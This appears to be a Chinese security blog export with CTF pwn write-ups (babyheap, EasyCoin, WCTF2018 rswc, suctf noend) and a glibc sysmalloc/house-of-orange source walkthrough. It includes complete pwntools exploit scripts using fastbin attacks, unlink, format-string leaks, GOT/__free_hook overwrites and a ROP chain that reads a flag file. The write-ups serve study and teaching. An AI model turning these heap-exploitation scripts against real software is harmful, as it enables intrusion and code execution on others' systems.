size字段。堆溢出漏洞如下：如果在已分配的content部分构造一个chunk size为0x30的fastbin，就能通过fastbin attack修改FD指针为这个chunk，再次分配的块就指向了这个chunk+0x10处，在读入0x20个字节时，就会覆盖掉下一块的chunk size字段。 另外由于存在UAF漏洞，在fastbin attack中也能顺便泄露堆地址。 接下来，把content0构造成空闲的上一块，写入FD和BK指针。这里就是unlink的套路了，FD和BK分别写入ptr[0]-0x18和ptr[0]-0x10，在unlink时先检查 FD-&gt;bk==BK-&gt;fd==P，其中P为要释放的地址，即：*(ptr[0]-0x18+0x18) == *(ptr[0]-0x10+0x10) ==*(ptr[0])，接着是unlink的FD-&gt;bk=BK，BK-&gt;fd=FD，即： *(ptr[0]-0x18+0x18)=ptr[0]-0x10，*(ptr[0]-0x10+0x10)=ptr[0]-0x18，最终*(ptr[0])=ptr[0]-0x18，即ptr[0]中写入的是ptr[0]-0x18。 free时同blind一样，要注意inuse位的问题，上一块已经标注为空闲了；当前块的inuse位由下一块控制，地址为content2+0x90，可以事先申请好content3、content4、content5，这样content5就代表着content2的下一块，已经分配的content5 inuse位一定为1；下一块的inuse位由top控制，肯定为1。 至此，就能实现对ptr的覆写：change第0块相当于向ptr[0]-0x18写入内容，能够覆盖ptr[0]中的值为ptr[8]，再change第0块相当于向ptr[8]中写入内容，能够覆写ptr[8]，ptr[9]和edit_time。 泄露libc地址&amp;覆写free_hook在上一步的ptr[8]中写入free@got地址，show第8块即可泄露libc地址。 在上一步的ptr[9]中写入ptr[0]地址，泄露libc地址之后，向ptr[9]中写入free_hook的地址，即ptr[0]中为free_hook地址，再change第0块，写入one_gadget。 利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'debug = 1if debug: p = process('./babyheap') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote('106.75.20.44',9999) libc = ELF('./libc.so.6')ptr_addr = 0x602060free_got = 0x601f98gadget =[0x45216,0x4526a,0xf02a4,0xf1147]def add(idx,content): p.sendlineafter("Choice:",'1') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def change(idx,content): p.sendlineafter("Choice:",'2') p.sendlineafter("Index:",str(idx)) p.sendlineafter("Content:",content)def show(idx): p.sendlineafter("Choice:",'3') p.sendlineafter("Index:",str(idx))def release(idx): p.sendlineafter("Choice:",'4') p.sendlineafter("Index:",str(idx))add(0,p64(0xdeadbeef)+p64(0x51)+p64(ptr_addr-0x18)+p64(ptr_addr-0x10)[:-1])add(1, p64(0xdeadbeef)+p64(0x31))add(2,'2gur1')add(3,'3gur1')add(4,'4gur1')add(5,'5gur1')release(3)release(2)release(3)#gdb.attach(p,'b *0x400d71\nc\nn\nx/8gx 0x602060')show(3)heap_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\0'))log.info('heap_addr:%#x',heap_addr)add(6,p64(heap_addr-0x20))#6-&gt;3add(7,'7gur1')#7-&gt;2add(8,'8gur1')#8-&gt;3payload = 'a'*16+p64(0x50)+p64(0x90)[:-1]add(9,payload)release(2)#gdb.attach(p)change(0,'a'*24+p64(ptr_addr+0x40)[:-1])change(0,p64(free_got)+p64(ptr_addr)+p64(0xffffffff))show(8)free_addr = u64(p.recvuntil('\n')[:-1].ljust(8,'\0'))free_hook = free_addr - libc.symbols['free']+libc.symbols['__free_hook']one_gadget = free_addr - libc.symbols['free']+ gadget[3]change(9,p64(free_hook))change(0,p64(one_gadget))release(4)p.interactive() EasyCoin基本逻辑程序实现了用户的注册和登录功能，在登录后能够发起交易。 regist函数构建一个新的块，包含用户名、密码、总金额和交易列表。 123456struct user&#123; char name[32]; char pwd[32]; int total=1000000000; char *deal_list=NULL;&#125; login函数比对用户名和密码。 display函数较简单，展示用户的基本信息。 send_coin发送硬币，先在接收方的deal_list中追加结点，再在当前用户的deal_list追加结点。 1234567struct deal&#123; struct deal * next; char * other;//sendor or receiver int id; bool flag;//0 for send money，1 for receive money int money;&#125; display_trans展示用户的交易信息，简单的读取deal_list。 change_pwd修改用户密码。 dele_user删除当前用户，释放name，pwd的空间，并沿着deal_list依次删除其他用户中包含与当前用户交易的deal，再删除deal_list中的deal，最终释放user的空间。 dele_deal是用于在交易另一方的deal_list中照当与当前用户的交易并删除。 漏洞分析漏洞一：在main函数中，第二个switch中的default，存在格式化字符串漏洞，可用于泄露地址。 漏洞二：在dele_user函数中，虽然释放了deal_list中的deal，但并没有修改deal_list的指向，仍然能通过user-&gt;deal_list访问到已经释放的块。另外，send_coin时能向自己发送金币，即deal_list可以有sendor和receiver都是自己的deal，在这种情况下，删除当前用户，dele_user就会通过deal-&gt;other信息找到自己，如果这笔交易之前有其他已经释放的交易，那么就会把已释放的FD当做next字段查找一下个deal，而FD的值相对于真正的内容相差16字节，利用这一点点偏移能够伪造假的next字段，指向我们可控的块。 漏洞利用泄露地址格式化字符串泄露libc地址和堆地址。 在调用printf(&amp;buf)时，观察各寄存器和栈结构，发现rcx中的值位于libc中，栈中的第四个参数是堆地址 在buf中写入%3$p和%9$p能够获取相关信息。 覆写free地址为system地址为user1构造一个正常的交易和一个发送给自己的交易，如下： 当删除user1时，会首先处理第一个与user2的正常交易，在程序逻辑中，user1的id为0的deal块（简称user1_0）和user2的id为0的deal块（简称user2_0）是一前一后创造的，这两块是挨在一起的。释放的时候会先释放user2_0，再释放user1_0，因此释放后，user1_0的FD指针指向user2_0。即user1_0的next指针被修改为user2_0。 接下来处理user1_1，由于这里的other仍是user1，就会沿着user1的deal_list查找，而user1_0的FD已经被修改成user2_0了，会把user2_0的previous size字段当做next处理，这个字段又恰好是user1_0的money字段。我们可以在此处把money指向user2_pwd处。user2_pwd是我们可控的，在这里伪造一个deal结构，并使id对应位置为1，这样就会释放user2_pwd。 删除完user1后，fastbin中的结构如下： 1user1_name&lt;-user1_pwd&lt;-user2_0&lt;-user1_0&lt;-user2_pwd&lt;-user1_1&lt;-user1_1&lt;-user1 通过修改user2的密码，修改fastbin中user2_pwd的下一块，这里将user2_pwd的FD修改为user3_pwd，这样在发起两次交易（与user）之后，注册新用户，就会分配到user3_pwd这块。 12user3_pwd&lt;-user2_pwd&lt;-user1_1&lt;-user1_1&lt;-user1user4 user3_2 user2_2 user3_1 user2_1 此时，修改user3的密码，就相当于修改user4的块，通过这一操作将user4-&gt;pwd修改为free@got，再通过修改user4的密码，向free@got中写入system地址。 整体的堆和fastbin结构如下： 利用脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *context.log_level='debug'p = process('./EasyCoin')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def regist(name,pwd,pwd1): p.sendlineafter("&gt; ",'1') p.sendlineafter("Please input username\n&gt; ",name) p.sendlineafter("Please input password\n&gt; ",pwd) p.sendlineafter("Verify input password\n&gt; ",pwd1)def login(name,pwd): p.sendlineafter("&gt; ",'2') p.sendlineafter("Please input username\n&gt; ",name) p.sendlineafter("Please input password\n&gt; ",pwd)def display(): p.sendlineafter("&gt; ",'1')def sendcoin(name,money): p.sendlineafter("&gt; ",'2') p.sendlineafter("What user do you send to?\n&gt; ",name) p.sendlineafter("Hom many?\n&gt; ",money)def change_pwd(pwd): p.sendlineafter("&gt; ",'4') p.sendlineafter("Please input password\n&gt; ",pwd)def dele(): p.sendlineafter("&gt; ",'5')def logout(): p.sendlineafter("&gt; ",'6')ptr= 0x603100free_got = 0x603018pwd2=p64(0)+p64(0xdeadbeef)+p64(1)regist("0gur1","123","123")regist("0gur2",pwd2,pwd2)regist("/bin/sh","","")login("0gur2",pwd2)#leak libcp.sendafter("&gt; ",'%3$p')p.recvuntil("[-] Unknown Command: ")addr = int(p.recv(14),16)sys_addr = addr - 728880free_addr = sys_addr - (libc.symbols['system']-libc.symbols['free'])log.info('sys_addr:%#x',sys_addr)log.info('free_addr:%#x',free_addr)#gdb.attach(p,"b *0x401717")p.sendafter("&gt; ",'%9$p')p.recvuntil("[-] Unknown Command: ")heap_addr = int(p.recvuntil('\x7f')[:-2],16)-0xa0log.info('heap_addr:%#x',heap_addr)sendcoin("0gur1",str(heap_addr+0x100))logout()#0gur1login("0gur1","123")sendcoin("0gur1",'12')dele()#0gur2pwd2 = p64(heap_addr+0x1b0)+p64(0xdeadbeef)+p64(1)login("0gur2",pwd2)change_pwd(p64(heap_addr+0x180))sendcoin("/bin/sh","12")sendcoin("/bin/sh","12")logout()regist("0gur3","123","123")#binshlogin("/bin/sh",p64(heap_addr+0x280))change_pwd(p64(heap_addr+0x280)+p64(free_got))logout()#0gur3#gdb.attach(p)login("0gur3",p64(free_addr))change_pwd(p64(sys_addr))logout()#binshlogin("/bin/sh",p64(heap_addr+0x280))dele()p.interactive() 另一种方法PS：写blog的过程中想到另外一种简单一点的方式，不用在fastbin中修改user2_pwd的FD指针，把user2_pwd分配给一个新的user，和上述同理，也是通过操作新user的pwd来写入system地址。 12……user2_pwd&lt;-user1_1 &lt;-user1_1 &lt;-user1 user5 user4_pwd user4_name user4 对应的利用脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level='debug'p = process('./EasyCoin')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def regist(name,pwd,pwd1): p.sendlineafter("&gt; ",'1') p.sendlineafter("Please input username\n&gt; ",name) p.sendlineafter("Please input password\n&gt; ",pwd) p.sendlineafter("Verify input password\n&gt; ",pwd1)def login(name,pwd): p.sendlineafter("&gt; ",'2') p.sendlineafter("Please input username\n&gt; ",name) p.sendlineafter("Please input password\n&gt; ",pwd)def display(): p.sendlineafter("&gt; ",'1')def sendcoin(name,money): p.sendlineafter("&gt; ",'2') p.sendlineafter("What user do you send to?\n&gt; ",name) p.sendlineafter("Hom many?\n&gt; ",money)def change_pwd(pwd): p.sendlineafter("&gt; ",'4') p.sendlineafter("Please input password\n&gt; ",pwd)def dele(): p.sendlineafter("&gt; ",'5')def logout(): p.sendlineafter("&gt; ",'6')ptr= 0x603100free_got = 0x603018pwd2=p64(0)+p64(0xdeadbeef)+p64(1)regist("0gur1","123","123")#user1regist("0gur2",pwd2,pwd2)#user2regist("/bin/sh","","")#user3login("0gur2",pwd2)#leak libcp.sendafter("&gt; ",'%3$p')p.recvuntil("[-] Unknown Command: ")addr = int(p.recv(14),16)sys_addr = addr - 728880free_addr = sys_addr - (libc.symbols['system']-libc.symbols['free'])log.info('sys_addr:%#x',sys_addr)log.info('free_addr:%#x',free_addr)p.sendafter("&gt; ",'%9$p')p.recvuntil("[-] Unknown Command: ")heap_addr = int(p.recvuntil('\x7f')[:-2],16)-0xa0log.info('heap_addr:%#x',heap_addr)sendcoin("0gur1",str(heap_addr+0x100))logout()#0gur1login("0gur1","123")sendcoin("0gur1",'12')dele()regist("0gur3","123","123")#user4regist("0gur4","123","123")#user5#0gur2pwd2 = p64(heap_addr+0x1c0)#+p64(heap_addr+0x70)+p64(1)#gdb.attach(p,"b *0x400e51")login("0gur2",pwd2)change_pwd(p64(heap_addr+0x1c0)+p64(free_got))logout()#0gur4login("0gur4",p64(free_addr))change_pwd(p64(sys_addr))logout()login("/bin/sh","")dele()p.interactive()]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WCTF2018-rswc]]></title>
    <url>%2F2018%2F07%2F11%2FWCTF2018-rswc%2F</url>
    <content type="text"><![CDATA[基本逻辑这一题也是典型的菜单类题目，共有5个功能： 123450. alloc1. edit2. show3. delete9. exit prepare函数模拟了堆初始化的过程。 其中mmap函数的原型如下： 1void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset); 第三个参数prot表示保护方式： 12345#define PROT_READ 0x1 /* page can be read */#define PROT_WRITE 0x2 /* page can be written */#define PROT_EXEC 0x4 /* page can be executed */#define PROT_SEM 0x8 /* page may be used for atomic ops */#define PROT_NONE 0x0 /* page can not be accessed */ 第6行的mmap分配了一块0x1000大小的内存，且不可读、写以及执行，用于对堆的保护。 第11行分配了类似于arena的区域，存放指针，权限为rw。 接着初始化heap的函数init__() 先分配了0x3000内存作为heap，然后再arena中记录heap地址、top地址、heap大小以及已经分配的chunk数量。然后对arena进行了初始化。 alloc函数用于分配新的chunk，关键函数是malloc_memory() malloc_memory函数首先计算chunk实际的大小，完成对齐的功能。然后检查arena中记录的chunk中有没有处于空闲状态并且大于需求大小的，如果有，就分配该chunk；否则就在top中分配一块。 此处可以确定arena的结构： 返回到alloc函数后，对新分配的chunk进行初始化，并更新记录第一块的指针first edit函数用于编辑chunk中的content，输入idx，通过每个chunk的下一地址字段找到下一块。 show函数展示chunk的size、content dele函数修改下一块地址字段，并将arena中对应的chunk的inuse位置零。 漏洞分析arena分配的大小为0x1000，除去前面32字节的信息字段，一共可以存放254个chunk信息；而heap分配了0x3000，如果按照最小的块32字节大小来分配，一共可以分配0x3000/0x20=384个chunk。因而在分配第255个chunk时，arena就会溢出，但由于arena的下一块是rwx都不可操作的保护区域，这个溢出无法利用。 看出题人的题解，提到了Linux内核中的ulimit和mmap的关系。 123456789101112131415void arch_pick_mmap_layout(struct mm_struct *mm)&#123; unsigned long random_factor = 0UL; if (current-&gt;flags &amp; PF_RANDOMIZE) random_factor = arch_mmap_rnd(); if (mmap_is_legacy()) &#123; mm-&gt;mmap_base = TASK_UNMAPPED_BASE + random_factor; mm-&gt;get_unmapped_area = arch_get_unmapped_area; &#125; else &#123; mm-&gt;mmap_base = mmap_base(random_factor); mm-&gt;get_unmapped_area = arch_get_unmapped_area_topdown; &#125;&#125; 当mmap_is_legacy返回1时（旧版），mmap从低地址向高地址增长；当返回0时（新版），mmap从高地址向低地址增长。 1234567891011static int mmap_is_legacy(void)&#123; //若设置了ADDR_COMPAT_LAYOUT属性，则提供旧版的虚拟地址空间内存 if (current-&gt;personality &amp; ADDR_COMPAT_LAYOUT) return 1; //判断堆栈大小是否为无限制的 if (rlimit(RLIMIT_STACK) == RLIM_INFINITY) return 1; //sysctl_legacy_va_layout可以在/proc/sys/vm/legacy_va_layout中查看 return sysctl_legacy_va_layout;&#125; Linux中的ulimit -s命令能够限制进程使用的堆栈大小，当-s的参数为unlimited时，则是对大小不做限制。也就是说，如果在运行程序之前执行该命令，在执行mmap时，就会进入到第二个条件分支，mmap_is_legacy就会返回1。 先看正常情况下，mmap的分配情况。先分配的arena的地址是0x7ffff7ff5000，后分配的heap地址为0x7ffff7ff2000，即当前情况下，mmap是由高地址向低地址增长的，mmap_is_legacy返回的为0。 通过vmmap也能看出mmap的增长方向，最先分配的rwx都不可操作的保护区域，地址在最下面。 而此时的sysctl_legacy_va_layout的值为0，即使用新版的映射方式从高到低增长。 接下来执行ulimit -s unlimited，再次运行程序，查看内存。此时先分配的arena地址比后分配的heap地址更小了，即mmap变成了由低地址向高地址增长。 在vmmap中，两块区域的位置也发生了变化。 此时就可以利用arena的溢出来覆写heap区域来达成目标了。 还有一点是，本题开启了沙箱保护，只允许进行open、read、write、exit和exit_group操作，也就是不能直接获取shell，但是可以直接读写flag文件来获取flag。 漏洞利用分配254个以上的chunk造成arena的溢出。利用arena中chunk info的size字段覆盖heap中chunk的size字段，edit时会造成chunk的content溢出，覆写下一个chunk的“下一地址”（简称next）字段，进而利用show泄露和edit覆写got中函数地址。 将atoi函数覆写为gets函数，造成栈溢出，进而构造ROP劫持程序执行流。 利用脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *import timecontext.log_level='debug'p = process('./rswc')libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')def alloc(size): p.recvuntil('&gt; ') p.sendline('0') p.recvuntil('size: ') p.sendline(str(size))def edit(idx,content): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('index: ') p.sendline(str(idx)) p.recvuntil('content: ') p.sendline(content)def show(idx): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('index: ') p.sendline(str(idx))def dele(idx): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(idx))#normal block:0~253for i in range(0,254): alloc(16)#no.254 will cover the first chunkalloc(256)#overwrite no.253's ptratoi_got = 0x602068edit(254,'0gur1'.ljust(16,'x')+p64(atoi_got-16))#leak addressshow(254)p.recvuntil(' content: ')atoi_addr = u64(p.recv(6)+'\x00\x00')open_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['open'])read_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['read'])gets_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['gets'])write_addr = atoi_addr - (libc.symbols['atoi']-libc.symbols['write'])log.info('atoi_addr:%#x' %atoi_addr)#overwrite atoi_got with getsedit(254,p64(gets_addr))libc_base = atoi_addr-libc.symbols['atoi']pr_addr = libc_base + 0x0000000000021102prsi_addr = libc_base + 0x0202e8ppr_addr = libc_base + 0x00000000001150c9buf = 0x602000+0xa00#ROPshellcode= '0gur1'.ljust(0x18,'x')shellcode+=p64(pr_addr)+p64(0)shellcode+=p64(ppr_addr)+p64(0x30)+p64(buf)shellcode+=p64(read_addr)shellcode+=p64(pr_addr)+p64(buf)shellcode+=p64(ppr_addr)+p64(0)+p64(0)shellcode+=p64(open_addr)shellcode+=p64(pr_addr)+p64(3)shellcode+=p64(ppr_addr)+p64(0x30)+p64(buf)shellcode+=p64(read_addr)shellcode+=p64(pr_addr)+p64(1)shellcode+=p64(ppr_addr)+p64(0x30)+p64(buf)shellcode+=p64(write_addr)p.recvuntil('&gt; ')p.sendline('1')p.sendline(shellcode)time.sleep(1)p.send('flag.txt')p.interactive() 参考链接：WCTF 2018 - binja - rswc]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sysmalloc源码分析]]></title>
    <url>%2F2018%2F07%2F10%2Fsysmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[之前在做SUCTF的note时接触到了house of orange的原理，即将top的大小修改为一个比较小的值，再分配一个比size大的值时，原来的top就会free并放入到unsorted bin里，重新产生一个新的top。而note这道题由于可以自己创造出unsorted bin，就没有修改top的大小。今天简单看了一下sysmalloc的源码，重新认识了house of orange。ps：在网上找了一些大佬讲原理的blog，发现各位大佬都分析的是非主分配区部分的源码，而实际上多数用到的是main arena的源码，虽然原理类似，但是金牛座就愿意钻牛角尖=。= 一个用来调试的栗子123456789101112131415#define fake_size 0x1fe1int main(void)&#123; void *ptr; ptr=malloc(0x10); ptr=(void *)((int)ptr+24); *((long long*)ptr)=fake_size; malloc(0x2000); malloc(0x60);&#125; 栗子参考了ctf-wiki，将top的大小改为了0x1fe1，然后再分配0x2000大小的chunk，由于_int_malloc的其他环节都不能处理了，由此调用sysmalloc sysmalloc的源码根据上面的栗子，在第二个malloc处对sysmalloc的源码逐步分析的 123456789101112131415161718192021222324252627282930313233343536373839static void *sysmalloc (INTERNAL_SIZE_T nb, mstate av)&#123; mchunkptr old_top; /* incoming value of av-&gt;top */ INTERNAL_SIZE_T old_size; /* its size */ char *old_end; /* its end address */ long size; /* arg to first MORECORE or mmap call */ char *brk; /* return value from MORECORE */ long correction; /* arg to 2nd MORECORE call */ char *snd_brk; /* 2nd return val */ INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */ INTERNAL_SIZE_T end_misalign; /* partial page left at end of new space */ char *aligned_brk; /* aligned offset into brk */ mchunkptr p; /* the allocated/returned chunk */ mchunkptr remainder; /* remainder from allocation */ unsigned long remainder_size; /* its size */ size_t pagesize = GLRO (dl_pagesize); bool tried_mmap = false; /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; …… &#125; av是当前的分配区，mmap_threshold是能够使用mmap分配的阈值，n_mmaps_max是mmap分配的内存块设定的最大值，调试查看这两个值： 显然当前我们输入的0x2000不满足这个条件，执行下一个分支。 123456789101112131415161718old_top = av-&gt;top;old_size = chunksize (old_top);old_end = (char *) (chunk_at_offset (old_top, old_size));brk = snd_brk = (char *) (MORECORE_FAILURE);/* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0));/* Precondition: not enough current space to satisfy nb request */assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE)); 接下来获取原来的top信息：起始地址、大小、终止地址。并且要求满足两个assert的条件： 第一次调用sysmalloc函数，top还没有初始化；或者已经初始化，top的大小大于MINSIZE（0x20），前一个chunk处于inuse状态，以及top chunk的结束地址是页对齐的。 原top的大小小于当前要分配chunk的大小。 1234567891011121314151617181920212223242526272829303132333435363738if (av != &amp;main_arena) &#123; …… &#125;else /* av == main_arena */ &#123; /* Request enough space for nb + pad + overhead */ size = nb + mp_.top_pad + MINSIZE; /* If contiguous, we can subtract out existing space that we hope to combine with new space. We add it back later only if we don't actually get contiguous space. */ if (contiguous (av)) size -= old_size; /* Round to a multiple of page size. If MORECORE is not contiguous, this ensures that we only call it with whole-page arguments. And if MORECORE is contiguous and this is not first time through, this preserves page-alignment of previous calls. Otherwise, we correct to page-align below. */ size = ALIGN_UP (size, pagesize); /* Don't try to call MORECORE if argument is so big as to appear negative. Note that since mmap takes size_t arg, it may succeed below even if we cannot call MORECORE. */ if (size &gt; 0) &#123; brk = (char *) (MORECORE (size)); LIBC_PROBE (memory_sbrk_more, 2, brk, size); &#125; 之后是判断av是主分配区还是配主分配区，大部分大佬分析的都是非主分配区这部分，我这里就主要看主分配区了。先是重新计算需要分配的size。然后判断当前分配区是否连续，并将size按照页对齐。当size&gt;0时，通过MORECORE（sbrk）分配连续的内存。 contiguous函数定义为： 12#define NONCONTIGUOUS_BIT (2U)#define contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0) 1234567891011if (brk != (char *) (MORECORE_FAILURE)) &#123; /* Call the `morecore' hook if necessary. */ void (*hook) (void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect (hook != NULL, 0)) (*hook)(); &#125; else &#123; …… &#125; 如果sbrk分配成功，并且MORECORE的hook函数存在，调用hook函数。（还不清楚hook用来干嘛） 12345678910111213141516171819if (brk != (char *) (MORECORE_FAILURE)) &#123; if (mp_.sbrk_base == 0) mp_.sbrk_base = brk; av-&gt;system_mem += size; /* If MORECORE extends previous space, we can likewise extend top size. */ if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE)) set_head (old_top, (size + old_size) | PREV_INUSE); else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123; /* Oops! Someone else killed our space.. Can't touch anything. */ malloc_printerr (3, "break adjusted to free malloc space", brk, av); &#125; 如果sbrk_base还没有初始化，就根据brk修改sbrk_base的值。更新当前分配区的内存分配总量。 如果新的brk和旧的top结尾是同一地址，也就是说新分配的内存与原top是挨着的，就直接更新原top头中的大小和PREV_INUSE位，相当于直接扩大了top。 如果brk小于原top结尾，则出错。 而对于house of orange，由于我们修改了top大小，top_end也提前了，此时分配的brk和top_end不是同一地址，而是从未修改前的top结尾开始分配的内存，即以上两个条件都不满足，从而进入到下面的这个分支。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 else &#123; front_misalign = 0; end_misalign = 0; correction = 0; aligned_brk = brk; /* handle contiguous cases */ …… /* Adjust top based on results of second sbrk */ if (snd_brk != (char *) (MORECORE_FAILURE)) &#123; av-&gt;top = (mchunkptr) aligned_brk; set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE); av-&gt;system_mem += correction; /* If not the first time through, we either have a gap due to foreign sbrk or a non-contiguous region. Insert a double fencepost at old_top to prevent consolidation with space we don't own. These fenceposts are artificial chunks that are marked as inuse and are in any case too small to use. We need two to make sizes and alignments work out. */ if (old_size != 0) &#123; /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK; set_head (old_top, old_size | PREV_INUSE); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ chunk_at_offset (old_top, old_size)-&gt;size = (2 * SIZE_SZ) | PREV_INUSE; chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size = (2 * SIZE_SZ) | PREV_INUSE; /* If possible, release the rest. */ if (old_size &gt;= MINSIZE) &#123; _int_free (av, old_top, 1); &#125; &#125; &#125; &#125; &#125;&#125; /* if (av != &amp;main_arena) */ 先有一些对齐操作，这里省略掉了，其中aligned_brk就是处理好之后的内存地址。 重新设置av-&gt;top的地址，为重新分配的aligned_brk，然后通过set_head设置top的大小和标志位，更新分配区的总分配内存量。 接着将top chunk切分为fenceposts和空闲块两部分，设置切分出空闲chunk大小为old_size。最终通过int_free释放掉old_top。 执行前后heap的大小比对： 以及top地址的变化： 第二个malloc执行结束后，unsortedbin中存放的即为原来的top地址 总结将sysmalloc的流程简化为以下流程（针对上面的栗子）：]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suctf2018-noend]]></title>
    <url>%2F2018%2F07%2F09%2Fsuctf2018-noend%2F</url>
    <content type="text"><![CDATA[基本逻辑 函数逻辑比较简单，用户输入size，程序就分配size大小的chunk，接着用户向新分配的chunk内写入内容，程序在终端显示。当size小于等于0x7f时，就释放该chunk。 漏洞分析乍一看，“咦，平时我们不都这么写吗”。实际上，在malloc之后要对返回值进行检查。如果malloc出错了，后续的操作很有可能超出我们的控制。 下面这个函数就是当调用malloc时执行的函数，它会首先获取一个分配区（arena_get），然后调用_int_malloc分配内存。 1234567891011121314151617181920212223242526272829303132void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); //获取分配区 arena_get (ar_ptr, bytes); //分配内存 victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ //分配失败时，换到其他分配区内分配 if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125; 由于noend程序中对输入的大小没有做限制，如果尝试输入一个很大的值，该值大于mmap分配的内存块设定的最大值（n_mmaps_max）,malloc在使用_int_malloc分配内存时，由于从fast bins，last remainder，small bins，large bins和top chunk都分配失败时，会调用sysmalloc函数，下面是对sysmalloc的简化。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; //由于输入的值已经大于n_mmaps_max，不会进入此处执行 …… &#125;……if (av != &amp;main_arena) &#123; //考虑初始情况下都是在main_arena中进行分配，此处也不会执行 …… &#125; else /* av == main_arena */ &#123; /* Request enough space for nb + pad + overhead */ size = nb + mp_.top_pad + MINSIZE; if (contiguous (av)) size -= old_size; size = ALIGN_UP (size, pagesize); if (size &gt; 0) &#123; //sbrk（MORECORE）是通过将数据段的下界移动来分配连续内存，当size很大时，sbrk将会失败：MORECORE_FAILURE brk = (char *) (MORECORE (size)); LIBC_PROBE (memory_sbrk_more, 2, brk, size); &#125; if (brk != (char *) (MORECORE_FAILURE)) &#123; …… &#125; else &#123; if (contiguous (av)) size = ALIGN_UP (size + old_size, pagesize); if ((unsigned long) (size) &lt; (unsigned long) (MMAP_AS_MORECORE_SIZE)) size = MMAP_AS_MORECORE_SIZE; if ((unsigned long) (size) &gt; (unsigned long) (nb)) &#123; //使用MMAP分配size大小的连续内存 char *mbrk = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0)); if (mbrk != MAP_FAILED) &#123; …… &#125; &#125; &#125; if (brk != (char *) (MORECORE_FAILURE)) &#123; …… &#125; &#125; /* if (av != &amp;main_arena) */ …… /* finally, do the allocation */ p = av-&gt;top; size = chunksize (p); //当前top大小为size，与申请分配的大小nb+MINSIZE比较 /* check that one of the above allocation paths succeeded */ if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; …… &#125; /* catch all failure paths */ __set_errno (ENOMEM); return 0; 当试图申请一块巨大的内存时，sbrk和mmap都会失败，最终_int_malloc将会return 0。__libc_malloc对返回值进行判断，如果返回为0且分配区不为空时，就调用arena_get_retry重新获取一个新的分配区，并在新的分配区里分配内存。奇怪的是，如果此时_int_malloc又一次分配失败返回0，__libc_malloc也不会有其他操作了，直接返回0（assert中的!victim返回1）。返回0之后，下面几句执行起来就会有问题： 123buf = malloc(size); read(0, buf, size); *((_BYTE *)buf + size - 1) = 0; 由于malloc返回了0，buf的值为0，read就是向0中写入内容，而*(buf+size-1)=0这一块，相当于向*(size-1)中写入0。 